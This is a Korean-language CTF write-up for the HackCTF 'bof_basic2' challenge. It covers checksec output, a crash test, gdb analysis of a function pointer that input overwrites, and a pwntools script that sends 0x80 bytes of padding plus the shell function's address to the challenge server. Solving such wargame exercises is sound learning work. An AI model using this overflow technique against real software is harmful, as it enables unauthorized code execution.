---
title: "HackCTF bof_basic2 Write-Up"
tags: ["wargame"]
categories: ["System"]
---

# Index

1. [문제 분석](#문제-분석)

* * *

## 문제 분석

문제 파일을 다운로드 받은 후 checksec을 통해 간단하게 파일에 대한 확인을 진행하였습니다.

```
[*] '/root/hackctf/bof_basic/bof_basic2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)]
```

마찬가지로 32bit elf였으며 NX bit만 활성화 되어 있었습니다.

프로그램을 실행하여 동작을 확인해보았습니다. 임의의 문자열을 전달할 경우 특정 문구가 출력되며 프로그램이 종료되는 것을 확인할 수 있었습니다.

```
root@3218f793af99:~/hackctf/bof_basic# ./bof_basic2
TEST HAHAHA
하아아아아아아아아앙
```

Overflow가 발생할 수 있을법한 길이의 문자열을 전달할 경우 segmentation fault가 발생하며 프로그램이 종료되었습니다.

```
root@3218f793af99:~/hackctf/bof_basic# (python3 -c 'print("A"*200)'; cat) | ./bof_basic2

Segmentation fault
```

Segmentation fault가 발생하는 것을 보아 입력값의 일부를 이후 명령을 실행하는데 사용하는 주소로 사용하지 않을까 가설을 세우고 gdb를 사용하여 분석을 진행하였습니다.

## GDB 분석

gdb를 통해 assembly code를 분석하기 이전에 프로그램 내에 존재하는 함수들을 확인해보았습니다. 그 중 main 함수 뿐만 아니라 shell, sup 함수 또한 발견할 수 있었습니다.

```
0x0804849b  shell
0x080484b4  sup
0x080484cd  main
```

shell 함수의 경우 dash shell을 실행하는 함수였으며 sup 함수는 문자열을 출력하는 함수였습니다. gdb를 사용해 x/s 옵션으로 확인하려 하였을 때 유니코드 같은 형태가 출력되는 것을 보아 "하아아아아아아아아앙" 문자를 출력하는 것으로 추정하였습니다.

main을 분석해보면 `fgets()` 함수로 입력받기 이전에 `$ebp-0xc` 위치에 sup 함수의 주소를 저장하는 것을 확인할 수 있었습니다. 이후 `fgets()` 함수를 통해 `$ebp-0x8c`부터 `0x85` byte만큼 입력받았습니다. 마지막으로 `$ebp-0xc`에 값을 eax로 mov 후 `call eax`를 실행하는 것을 보아 해당 위치에 shell 함수의 주소를 입력하여 flag를 획득할 수 있음을 추측할 수 있었습니다.

## Exploit

buf부터 `$ebp-0xc`의 거리를 계산해보면 0x80 byte임을 알 수 있었습니다. 따라서 0x80 byte의 padding 이후 shell 함수의 주소를 입력하여 exploit code를 작성하였습니다.

```python
#!/usr/bin/python3

import pwn 

p = pwn.remote("ctf.j0n9hyun.xyz", 3001)

shell = 0x0804849b
padding = b"A"*0x80

payload = padding + pwn.p32(shell)

p.sendline(payload)

p.interactive()
```
